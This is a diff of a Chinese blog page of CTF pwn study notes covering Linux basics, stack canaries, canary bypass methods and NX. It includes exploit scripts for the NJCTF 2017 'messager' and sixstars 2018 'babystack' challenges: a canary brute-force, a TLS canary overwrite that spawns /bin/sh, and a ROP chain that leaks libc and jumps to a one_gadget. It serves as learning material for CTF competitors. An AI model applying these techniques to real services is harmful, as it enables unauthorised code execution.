@@ -203,7 +203,148 @@
 <li>IA-32e。该模式包含两个子模式，分别为兼容模式和 64 位模式，在兼容模式下现有的 32位和 16 位程序无须重新编译；在 64 位模式下，处理器将在 64 位的地址空间下运行程序。</li>
 </ul>
 <p>&emsp;MOV 指令是图灵完备的。XCHG 允许交换 2 个操作数的值。</p>
-<h2 id="0x02-Linux-安全机制"><a href="#0x02-Linux-安全机制" class="headerlink" title="0x02 Linux 安全机制"></a>0x02 Linux 安全机制</h2><p>to be continued..</p>
+<h2 id="0x02-Linux-安全机制"><a href="#0x02-Linux-安全机制" class="headerlink" title="0x02 Linux 安全机制"></a>0x02 Linux 安全机制</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>&emsp;Linux 的 shell 一般是 bash，也可以是 zsh。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var=&quot;test&quot;     </span><br><span class="line">echo &#x27;this is $var&#x27; // 输出为 this is $var</span><br><span class="line">echo &quot;this is $var&quot; // 输出为 this is test</span><br><span class="line">echo `date`         // 执行 date 指令并输出</span><br><span class="line">ldd /file           // 输出 file 所需的依赖库</span><br></pre></td></tr></table></figure>
+<p>&emsp;流可以理解成一串连续的、可边读边处理的数据，标准流(standard streams)可以分为标准输输入/标准输出/标准错误。文件描述符（file descriptor）是<code>内核为管理已打开文件所创建的索引</code>，使用一个非负整数来指代被打开的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmd &gt; file  // 重定向并覆盖</span><br><span class="line">cmd &gt;&gt; file // 重定向追加</span><br><span class="line">cmd &lt; file  // file 作为 cmd 的输入</span><br><span class="line">cmd &lt;&lt; tag  // 从标准输入读取直到遇到 tag</span><br><span class="line">cmd 2 &gt; file // cmd 的错误覆盖到 file</span><br><span class="line">2 &gt;&amp;1        // 合并标准错误与标准输出</span><br></pre></td></tr></table></figure>
+<p>&emsp;UID 是用户 ID，GID 是组 ID。用 env 指令可以查看环境变量。一些特殊的环境变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD：定义程序运行时优先加载的动态链接库。ELF 文件的 INTERP 字段指定了解释器 ld.so 的位置，如果该路径与动态链接库的位置不匹配，则会触发错误。</span><br><span class="line">environ：libc 中定义的全局变量，指向内存中的环境变量表（栈内）。</span><br></pre></td></tr></table></figure>
+<p>&emsp;每个进程都对应 /proc下的一个目录，目录名就是进程的 PID。procfs 是 Linux 内核提供的虚拟文件系统（只占用内存，不占用存储），为访问内核数据提供接口。可以通过 procfs 查看系统硬件及当前正在运行进程的信息（进程内存、段、栈等），并可以通过修改其中内容来改变内核状态。如下图所示，感觉很有用。</p>
+<p><img src="/images/ctf-guide-pwn-1/image-20240410233356130.png" alt="image-20240410233356130" style="zoom:67%;" /></p>
+<p>&emsp;Intel 是小端序，TCP/IP 协议与 JVM 是大端。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace ls -l // 追踪 ls -l 运行时所运行的系统调用</span><br></pre></td></tr></table></figure>
+<p>&emsp;调用约定（内核）：</p>
+<ul>
+<li>32 位系统调用：Linux 系统调用使用寄存器传递参数，eax 为 syscall_number，ebx、ecx、edx、esi 和 ebp 用于传递参数，返回值保存在 eax 中，使用 int 0x80 或 sysenter 进入内核态。sysenter 需要用户在用户态手动布置栈，这是因为在 sysenter 返回时，会执行 kernel_vsyscall，而 kernel_vsyscall 封装了DSO 的一部分（允许程序在用户层执行内核代码）。</li>
+<li>64 位系统调用：系统调用通过 syscall 完成，系统调用的参数限制为 6 个（rdi、rsi、rdx、r10、r8、r9），不直接从堆栈上传递任何参数。</li>
+</ul>
+<p>&emsp;调用约定（用户）：</p>
+<ul>
+<li><p>32 位函数调用：参数通过栈进行传递。</p>
+</li>
+<li><p>64 位函数调用：顺序使用 rdi、rsi、rdx、rcx、r8、r9 传参，所以如果有多于 6 个的参数，则在栈上传递。</p>
+</li>
+</ul>
+<h3 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack Canaries"></a>Stack Canaries</h3><p>&emsp;栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。程序只需要在函数返回前检查 Canary 是否被篡改，就可以保护栈。</p>
+<p><strong>3 种 Stack Canaries：</strong></p>
+<ul>
+<li>Terminator canaries。由于许多栈溢出都是由于字符串操作不当所产生的，而这些字符串以 0x00 结尾。因此，将低位设置为 0x00，既可以防止被泄露，也可以防止被伪造。</li>
+<li>Random canaries。通常在程序初始化时随机生成，并保存在一个安全的地方。</li>
+<li>Random XOR canaries。与 random canaries 类似，但多了一个 XOR 操作，这样无论是 canaries 被篡改还是 XOR 的控制数据被篡改，都会发生错误。</li>
+</ul>
+<p><strong>与 Stack Canaries 相关的 gcc 编译选项：</strong></p>
+<ul>
+<li>-fstack-protector。保护 alloca 函数和内部缓冲区大于 8 字节的函数。</li>
+<li>-fstack-protector-strong。增加对局部数组定义和地址引用的函数的保护。</li>
+<li>-fstack-protector-explicit。对 stack protect 属性的函数启用保护。</li>
+<li>-fno-stack-protector。禁用保护。</li>
+</ul>
+<p><img src="/images/ctf-guide-pwn-1/1713063306747-f31f078c-d244-458a-a3a9-2b6b2c51ee38.png" alt="img"></p>
+<p>&emsp;在 Linux 中，fs 寄存器被用于存放线程局部存储（Thread Local Storage，TLS），TLS 是为了避免多个线程同时访问/修改同一全局变量时所导致的冲突（TLS 为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其他线程的副本冲突，从线程的角度看，就好像每一个线程都完全拥有该变量）。在 glibc 里，TLS 结构体偏移 0x28的地方是 stackguard。如果是 32 位程序，stackguard 存放在 gs:0x14。</p>
+<p><strong>Stack Canaries 具体的实现：</strong></p>
+<p>&emsp;64 位程序加载时 glibc 中的 ld.so 首先初始化 TLS：</p>
+<ul>
+<li><p>使用 arch_prctl 系统调用分配 TLS 空间，设置 fs 寄存器指向 TLS。</p>
+</li>
+<li><p>调用 security_init 生成 stackguard，并放入 fs:0x28。security_init 内部逻辑为：</p>
+</li>
+</ul>
+<ol>
+<li><p>Step1：生成 Canary。进入 _dl_setup_stack_chk_guard，并根据位数生成相应的 Canary 值。为了使 Canary 具有字符截断的效果，其最低位被设置为 0x00。如果 dl_random 指针为 NULL，那么 Canary 为定值。</p>
+</li>
+<li><p>Step2：将 Canary 赋给 fs:0x28，或者将 Canary 赋给全局变量 __stack chk_guard（.bss 段）。使用 THREAD_SETMEM 修改线程描述符的成员。</p>
+</li>
+</ol>
+<p><strong>绕过思路：</strong></p>
+<ul>
+<li>读 Canaries 的值，在栈溢出时覆盖上去，使其保持不变。</li>
+<li>同时篡改 TLS 和栈上的 Canaries。</li>
+</ul>
+<p><strong>分析文件流程：</strong></p>
+<ul>
+<li>file xxx</li>
+<li>pwn checksec xxx</li>
+</ul>
+<h4 id="NJCTF-2017-messager"><a href="#NJCTF-2017-messager" class="headerlink" title="NJCTF 2017: messager"></a>NJCTF 2017: messager</h4><p>&emsp;发现开了 canary。</p>
+<p><img src="/images/ctf-guide-pwn-1/1713075310049-9d65fda0-0e7a-44b0-8fed-a2752effb3f6.png" alt="img"></p>
+<p><img src="/images/ctf-guide-pwn-1/1713075340818-a96dc691-7429-4d8f-bb00-869d043aaacb.png" alt="img"></p>
+<ul>
+<li><p>开一个 socket，监听 5555 端口，若有连接请求就 fork 一个子进程来处理连接。</p>
+</li>
+<li><p>子进程接收消息（其中子进程有栈溢出漏洞），接收到之后就发送 Message received。</p>
+</li>
+</ul>
+<p>&emsp;通常，对 Canaries 进行爆破是太可能的（虽然低位是固定的 0x00），因为会使程序崩溃。程序重启后 Canaries 会重新生成，但同一个进程内（包括子进程）的 Canaries 不会变，且子进程崩溃不会影响到主进程，因此可以爆破。思路：</p>
+<ul>
+<li>根据进程崩溃与否来判断填充的字节是否正确。</li>
+<li>覆盖返回地址，定向到发 flag 的函数，获得 flag。（内存结构：s[104] - canary - v2 - ret，低地址到高地址）</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(c):02x&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    <span class="keyword">global</span> canary</span><br><span class="line">    canary = <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">            io.recv()</span><br><span class="line"></span><br><span class="line">            io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="built_in">chr</span>(x))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io.recv()</span><br><span class="line">                canary += <span class="built_in">chr</span>(x)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                io.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;canary&quot;</span>, string_to_hex(canary))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">5555</span>)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># s[104] and v2</span></span><br><span class="line">    io.send(<span class="string">&quot;A&quot;</span>*<span class="number">104</span> + canary + <span class="string">&quot;A&quot;</span>*<span class="number">8</span> + <span class="string">&quot;\xc6\x0b@\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    leak_canary()</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+<h4 id="sixstars-CTF-2018：babystack"><a href="#sixstars-CTF-2018：babystack" class="headerlink" title="sixstars CTF 2018：babystack"></a>sixstars CTF 2018：babystack</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fstack-protector-strong -s -pthread bs.c -o bs -Wl, -z, now, -z, relro</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-s。在生成的可执行文件中去除符号表信息和调试信息。</li>
+<li>-pthread。启用 POSIX 线程库，确保编译器在预处理、编译和链接阶段正确处理多线程代码。</li>
+<li>-Wl, -z, now, -z, relro。传递两个链接器选项：</li>
+</ul>
+<ol>
+<li><ul>
+<li>now。使用立即绑定模式，即在程序启动时立即解析所有动态库符号引用，而不是延迟到符号被使用时才解析。</li>
+</ul>
+</li>
+<li><ul>
+<li>relro。使程序的某些部分（主要是动态链接信息）变为只读，这可以防止这些部分被修改，增强安全性。</li>
+</ul>
+</li>
+</ol>
+<p><img src="/images/ctf-guide-pwn-1/1713081396919-bc091f75-9ee8-4d5b-9f0e-ebff63272a42.png" alt="img"></p>
+<p><img src="/images/ctf-guide-pwn-1/1713081252426-63edcbf3-9e76-44a6-8cf6-1dd8a936d368.png" alt="img"></p>
+<p>&emsp;其实，通过 pthread_create 创建的线程，glibc 在 TLS 的实现上是有问题的。具体而言：</p>
+<ul>
+<li><p>由于栈是由高地址向低地址增长，glibc 在高地址对 TLS 进行初始化，从 TLS 减去一个固定值，可以得到新线程用于栈寄存器的值（新线程用于保存栈寄存器的地址）。</p>
+</li>
+<li><p>从 TLS 到传递给 pthread_create 的运行函数的栈帧，距离小于一页。因此，攻击者无须纠结原 canary 的值是什么，可以直接溢出足够多的数据篡改 tcbhead_t.stack_guard，也就是同时篡改 TLS 和栈上的 Canaries。</p>
+</li>
+</ul>
+<p>&emsp;给一个相关的代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;cstdio&gt;</span><br><span class="line"></span><br><span class="line">void pwn_payload() &#123;</span><br><span class="line">    char *argv[2] = &#123;&quot;/bin/sh&quot;, 0&#125;;</span><br><span class="line">    execve(argv[0], argv, 0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int fixup = 0;</span><br><span class="line">void *first(void *x) &#123;</span><br><span class="line">    unsigned long *addr;</span><br><span class="line"></span><br><span class="line">    // 获取 FS 的地址（线程的 TLS）</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    printf(&quot;thread FS %p\n&quot;, addr);</span><br><span class="line">    printf(&quot;cookie thread: 0x%lx\n&quot;, addr[5]);</span><br><span class="line"></span><br><span class="line">    // 获取当前函数（first）的栈基址</span><br><span class="line">    // 内存：ret addr - canaries，从高到低</span><br><span class="line">    unsigned long *frame = __builtin_frame_address(0);</span><br><span class="line">    printf(&quot;stack_cookie addr %p\n&quot;, &amp;frame[-1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;diff: %lx\n&quot;, (char*)addr - (char*)&amp;frame[-1]);</span><br><span class="line">    unsigned long len = (unsigned long)((char*)addr - (char*)&amp;frame[-1]) + fixup;</span><br><span class="line">    void *expolit = malloc(len);</span><br><span class="line">    memset(expolit, 0x41, len);</span><br><span class="line"></span><br><span class="line">    void *ptr = &amp;pwn_payload;</span><br><span class="line">    memcpy((char*)expolit+16, &amp;ptr, 8);</span><br><span class="line">    memcpy(&amp;frame[-1], expolit, len);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv, char **envp)&#123;</span><br><span class="line">    pthread_t one;</span><br><span class="line">    unsigned long *addr;</span><br><span class="line">    void *val;</span><br><span class="line"></span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    if (argc &gt; 1) &#123;</span><br><span class="line">        fixup = 0x30;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;main FS %p\n&quot;, addr);</span><br><span class="line">    printf(&quot;cookie main: 0x%lx\n&quot;, addr[5]);</span><br><span class="line">    pthread_create(&amp;one, NULL, &amp;first, 0);</span><br><span class="line">    pthread_join(one, &amp;val);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/ctf-guide-pwn-1/1713086064840-8d513db2-3a3f-4e41-9fa6-1c6d60bea93b.png" alt="img"></p>
+<p><strong>解题思路：</strong></p>
+<ul>
+<li>通过栈溢出构造 rop。</li>
+<li>使用 put 函数 leak 出 libc 的基地址。</li>
+<li>找到 one_gadget 的偏移，并计算出 one_gadget 的实际地址。</li>
+<li>将这个地址读到 bss 段，使用 leave+ret，劫持 rip 到one_gadaget。</li>
+</ul>
+<p><strong>Step1：使用 put 函数 leak 出 libc 的基地址</strong></p>
+<p>&emsp;当调用 puts.plt（代码段） 的时候，系统会将真正的 puts 函数地址 link 到 puts.got（数据段） 中，然后 puts.plt 会根据 puts.got 跳转到 puts 函数。我们最终想达到的目的是 put(puts.got)。因此需要 gadget 去调用 put 函数，并传递 put.got 参数。</p>
+<p><img src="/images/ctf-guide-pwn-1/1713254895614-0e8dc5e5-a26c-4987-9a4b-1831fadcf7c3.png" alt="img"></p>
+<p>&emsp;其中，pop_rdi_addr 可以使用 ROPgadget 在 bs 文件中找。</p>
+<p><img src="/images/ctf-guide-pwn-1/1713255005808-ee5c1f97-a315-4dae-8897-2311eed30bbb.png" alt="img"></p>
+<p>&emsp;因此，pop_rdi_addr = 0x400c03。</p>
+<p><strong>Step2：找到 one_gadget 的偏移，并计算出 one_gadget 的实际地址，并使用 leave+ret 劫持到 one_gadget</strong></p>
+<p>&emsp;one_gadget 可以理解为开 bash 的代码段，如下所示：</p>
+<p><img src="/images/ctf-guide-pwn-1/1713255095699-4f14fbe4-0df3-48d8-90a8-05c448ed6fcf.png" alt="img"></p>
+<p>&emsp;可以使用 one_gadget 在 libc.so 中找（在这里取 0xf1147）：</p>
+<p><img src="/images/ctf-guide-pwn-1/1713255151958-91ba2c54-7e5a-4cdf-85c3-4124eac351f0.png" alt="img"></p>
+<p>&emsp;接下来的构造理解起来比较难，具体而言：</p>
+<ul>
+<li>拿到上一步的 libc 基地址。</li>
+<li>计算 one_gadget 的实际地址，使用 read(0, bss_addr) 将实际地址写入到 bss_addr 中。</li>
+<li>使用 leave+ret 指令（相当于 mov rsp, rbp; pop rbp; pop rip;）将 rip 设置到 bss_addr 指向的地址。（虽然 bss 段是 NX 保护不可执行的，但是 libc 中的 one_gadget 是可执行的）</li>
+</ul>
+<p><img src="/images/ctf-guide-pwn-1/1713256233734-61e3671d-ce07-4226-ad05-c6c5b1f0d8f2.png" alt="img"></p>
+<p>&emsp;其中，pop_rsi_r15_addr 可以使用 ROPgadget 找到，其值为 0x400c01。leave_ret_addr 也可以找到，为 0x400955。</p>
+<p><img src="/images/ctf-guide-pwn-1/1713256363727-4f93a7b4-d22f-472b-828a-e6076dd21214.png" alt="img"></p>
+<p>&emsp;bss_addr 可以使用 readelf -S bs 找到，为 0x602010。</p>
+<p><img src="/images/ctf-guide-pwn-1/1713256586918-1fbc049c-07f1-400b-8003-92d2a038c1e5.png" alt="img"></p>
+<p><strong>EXP：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bs&quot;, env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;libc.so&#x27;&#125;)</span><br><span class="line">elf = ELF(&#x27;bs&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc.so&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400c03</span><br><span class="line">pop_rsi_r15=0x400c01</span><br><span class="line">leave_ret=0x400955</span><br><span class="line"></span><br><span class="line">bss_addr=0x602030</span><br><span class="line"></span><br><span class="line"># TLS 与栈中的 canary 小于 1 页</span><br><span class="line">payload=b&#x27;\x00&#x27;*0x1008</span><br><span class="line">payload+=b&#x27;\x11&#x27;*0x8                            # canary</span><br><span class="line">payload+=p64(bss_addr-0x8)                      # rbp</span><br><span class="line">payload+=p64(pop_rdi)+p64(elf.got[&#x27;puts&#x27;])      # rdi=puts.got</span><br><span class="line">payload+=p64(elf.plt[&#x27;puts&#x27;])                   # puts(puts.got)</span><br><span class="line">payload+=p64(pop_rdi)+p64(0)                    # rdi=0</span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(0)  # rsi=bss_addr</span><br><span class="line">payload+=p64(elf.plt[&#x27;read&#x27;])</span><br><span class="line">payload+=p64(leave_ret)</span><br><span class="line">payload=payload.ljust(0x17e8,b&#x27;\x00&#x27;)           # 0x17e8 不知道咋得到的</span><br><span class="line">payload+=b&#x27;\x11&#x27;*0x8</span><br><span class="line">payload=payload.ljust(0x2000,b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;send?\n&quot;,str(0x2000).encode())</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&quot;goodbye.\n&quot;)</span><br><span class="line"></span><br><span class="line">libc_base=u64(io.recv(6).ljust(8,b&quot;\x00&quot;))-libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">one_gadget=libc_base+0xf1147</span><br><span class="line">log.info(&quot;libc address: 0x%x&quot;%libc_base)</span><br><span class="line"></span><br><span class="line">log.info(&quot;one gadget: 0x%x&quot;%one_gadget)</span><br><span class="line">io.send(p64(one_gadget))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>&emsp;这个 exp 一直运行不起来，报内部错误，也没有深究。</p>
+<h4 id="NX-No-eXecute"><a href="#NX-No-eXecute" class="headerlink" title="NX:No-eXecute"></a>NX:No-eXecute</h4><p>&emsp;将数据所在的内存页标识为不可执行。实施 NX 有多种技术，Windows 上是 DEP，Linux 上是 NX、W^X、PaX、Exec Shield 等。</p>
+<p>&emsp;NX 需要结合软件和硬件共同完成。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">硬件层面：利用处理器的 NX 位，对页表项中的第 63 位进行设置，设置为 1 表示不可执行。一旦程序计数器（PC）在受保护的页面内，就会触发硬件层面的异常。</span><br><span class="line"></span><br><span class="line">软件层面：NX 有时会给动态生成的代码（JIT）来问题。因此在软件层面提供了 API。Windows 的 VirtualProtect/VirtualAlloc，Linux 的 mprotect/mmap。</span><br></pre></td></tr></table></figure>
+<p>&emsp;NX 开启后，程序的 .text 为可执行，而 .data、.bss 以及栈、堆均为不可执行。因此，通过修改 GOT 来执行 shellcode 的方式不再可行，但不能阻止攻击者通过代码重用来进行攻击（ret2libc）（我理解就是找 libc 中的 one_gadget）。</p>
+<h5 id="NX-的实现"><a href="#NX-的实现" class="headerlink" title="NX 的实现"></a>NX 的实现</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z exestack hello.c</span><br></pre></td></tr></table></figure>
 
   
 	</div>
@@ -312,7 +453,7 @@
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
-			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CTF-%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PWN"><span class="toc-article-text">CTF 竞赛权威指南-PWN</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x00-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x00 二进制文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-%E4%B8%AA%E9%98%B6%E6%AE%B5"><span class="toc-article-text">4 个阶段</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5"><span class="toc-article-text">预处理阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5"><span class="toc-article-text">编译阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%B1%87%E7%BC%96%E9%98%B6%E6%AE%B5"><span class="toc-article-text">汇编阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E9%98%B6%E6%AE%B5"><span class="toc-article-text">链接阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%A4%87%E6%B3%A8"><span class="toc-article-text">备注</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ELF-%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-article-text">ELF 文件格式</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%93%BE%E6%8E%A5%E8%A7%86%E8%A7%92"><span class="toc-article-text">链接视角</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%BF%90%E8%A1%8C%E8%A7%86%E8%A7%92"><span class="toc-article-text">运行视角</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">静态链接</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-article-text">动态链接</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x01-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80"><span class="toc-article-text">0x01 汇编基础</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CISC-%E4%B8%8E-RISC"><span class="toc-article-text">CISC 与 RISC</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#x86-x64-%E5%9F%BA%E7%A1%80"><span class="toc-article-text">x86&#x2F;x64 基础</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x02-Linux-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="toc-article-text">0x02 Linux 安全机制</span></a></li></ol></li></ol>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CTF-%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PWN"><span class="toc-article-text">CTF 竞赛权威指南-PWN</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x00-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-article-text">0x00 二进制文件</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-%E4%B8%AA%E9%98%B6%E6%AE%B5"><span class="toc-article-text">4 个阶段</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5"><span class="toc-article-text">预处理阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5"><span class="toc-article-text">编译阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%B1%87%E7%BC%96%E9%98%B6%E6%AE%B5"><span class="toc-article-text">汇编阶段</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" 